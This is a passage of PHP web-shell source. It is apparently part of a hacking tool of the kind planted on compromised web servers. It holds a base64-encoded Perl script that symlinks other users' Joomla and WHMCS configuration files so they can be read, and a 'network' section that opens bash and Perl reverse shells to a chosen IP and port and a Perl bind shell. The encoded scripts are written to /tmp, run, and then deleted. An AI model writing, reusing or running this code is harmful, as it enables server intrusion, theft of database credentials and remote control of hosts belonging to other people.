hbC9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2l0ZS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbWFpbi9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvaG9tZS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvZGVtby9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdGVzdC9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdjEvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3YyL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9qb29tbGEvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL25ldy9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvV0hNQ1Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93aG1jczEvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XaG1jcy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dobWNzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd2htY3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XSE1DL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvV2htYy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dobWMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XSE0vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XaG0vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93aG0vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9IT1NUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvSG9zdC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2hvc3Qvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9TVVBQT1JURVMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9TdXBwb3J0ZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zdXBwb3J0ZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9kb21haW5zL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvZG9tYWluL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvSG9zdGluZy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0hPU1RJTkcvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ob3N0aW5nL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0FSVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NhcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jYXJ0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvT1JERVIvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9PcmRlci9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL29yZGVyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0xJRU5UL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2xpZW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0xJRU5UQVJFQS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NsaWVudGFyZWEvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbGllbnRhcmVhL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU1VQUE9SVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1N1cHBvcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQklMTElORy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JpbGxpbmcvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iaWxsaW5nL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQlVZL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQnV5L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYnV5L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvTUFOQUdFL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvTWFuYWdlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbWFuYWdlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0xJRU5UU1VQUE9SVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NsaWVudFN1cHBvcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DbGllbnRzdXBwb3J0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50c3VwcG9ydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NIRUNLT1VUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2hlY2tvdXQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jaGVja291dC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JJTExJTkdTL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iaWxsaW5ncy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JBU0tFVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0Jhc2tldC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2Jhc2tldC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NFQ1VSRS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NlY3VyZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3NlY3VyZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NBTEVTL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU2FsZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zYWxlcy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JJTEwvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CaWxsL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmlsbC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1BVUkNIQVNFL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvUHVyY2hhc2Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9wdXJjaGFzZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0FDQ09VTlQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9BY2NvdW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYWNjb3VudC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1VTRVIvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9Vc2VyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvdXNlci9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NMSUVOVFMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DbGllbnRzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50cy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JJTExJTkdTL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iaWxsaW5ncy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL01ZL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvTXkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9teS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3NlY3VyZS93aG0vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zZWN1cmUvd2htY3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LA0KCXtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9wYW5lbC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NsaWVudGVzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwNCgl7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50ZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sDQoJe2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3N1cHBvcnQvb3JkZXIvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9DQopOw0KZm9yZWFjaCAoQGFycmF5KXsNCglteSAkY29uZmlnbnlhID0gJF8tPntjb25maWdkaXJ9Ow0KCW15ICR0eXBlY29uZmlnID0gJF8tPnt0eXBlfTsNCglzeW1saW5rKCIkY29uZmlnbnlhIiwiaWR4X3N5bTQwNC8kdXNlcm55YS0kdHlwZWNvbmZpZy50eHQiKTsNCglta2RpciAiaWR4X3N5bTQwNC8kdXNlcm55YS0kdHlwZWNvbmZpZy50eHQ0MDQiOw0KCXN5bWxpbmsoIiRjb25maWdueWEiLCJpZHhfc3ltNDA0LyR1c2VybnlhLSR0eXBlY29uZmlnLnR4dDQwNC8weDE5OTkudHh0Iik7DQoJY29weSgiaWR4X3N5bTQwNC9uZW11LnR4dCIsImlkeF9zeW00MDQvJHVzZXJueWEtJHR5cGVjb25maWcudHh0NDA0Ly5odGFjY2VzcyIpIDsNCgl9DQp9DQpwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCnByaW50ICI8aGVhZD48dGl0bGU+QnlwYXNzIDQwNCBCeSAweDE5OTk8L3RpdGxlPjwvaGVhZD4iOw0KcHJpbnQgJzxtZXRhIGh0dHAtZXF1aXY9InJlZnJlc2giIGNvbnRlbnQ9IjU7IHVybD1pZHhfc3ltNDA0Ii8+JzsNCnByaW50ICc8Ym9keT48Y2VudGVyPjxoMT4weDE5OTkgTmV2ZXIgRGllPC9oMT4nOw0KcHJpbnQgJzxhIGhyZWY9ImlkeF9zeW00MDQiPktsaWsgRGlzaW5pPC9hPic7DQp1bmxpbmsoJDApOw==";
					save("/tmp/symlink404.pl", "w", base64_decode($sym['code']));
					exe("perl /tmp/symlink404.pl");
					sleep(1);
					@unlink("/tmp/symlink404.pl");
					@unlink("passwd.txt");
					@unlink("idx_sym404/pas.txt");
					@unlink("idx_sym404/nemu.txt");
				}

				print "<div style='background: #ffffff; width: 100%; height: 100%'>";
				print "<iframe src='http://".$_SERVER['HTTP_HOST']."/".$GLOBALS['FILEPATH']."/idx_sym404/' frameborder='0' scrolling='yes'></iframe>";
				print "</div>";
			}
		}
	}
	elseif($toolsname === "network") {
		$args = explode(" ", $args);

		if($args[0] === "bc") {
			if(empty($args[1])) die(color(1, 1, "Set Your IP for BackConnect!"));
			if(empty($args[2])) die(color(1, 1, "Set Your PORT for BackConnect!"));
			if(empty($args[3])) die(color(1, 1, "Missing type of reverse shell: 'bash', 'perl'."));

			if($args[3] === "bash") {
				exe("/bin/bash -i >& /dev/tcp/".$args[1]."/".$args[2]." 0>&1");
			}
			elseif($args[3] === "perl") {
				$bc['code'] = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
				save("/tmp/bc.pl", "w", base64_decode($bc['code']));
				$bc['exec'] = exe("perl /tmp/bc.pl ".$args[1]." ".$args[2]." 1>/dev/null 2>&1 &");
				sleep(1);
				print "<pre>".$bc['exec']."\n".exe("ps aux | grep bc.pl")."</pre>";
				@unlink("/tmp/bc.pl");
			}
		}
		elseif($args[0] === "bp") {
			if(empty($args[1])) die(color(1, 1, "Set Your PORT for Bind Port!"));
			if(empty($args[2])) die(color(1, 1, "Missing type of reverse shell: 'bash', 'perl'."));

			if($args[2] === "perl") {
				$bp['code'] = "IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
				save("/tmp/bp.pl", "w", base64_decode($bp['code']));
				$bp['exec'] = exe("perl /tmp/bp.pl ".$args[1]." 1>/dev/null 2>&1 &");
				sleep(1);
				print "<pre>".$bp['exec']."\n".exe("ps aux | grep bp.pl")."</pre>";
				@unlink("/tmp/bp.pl");
			}
		}
		else {
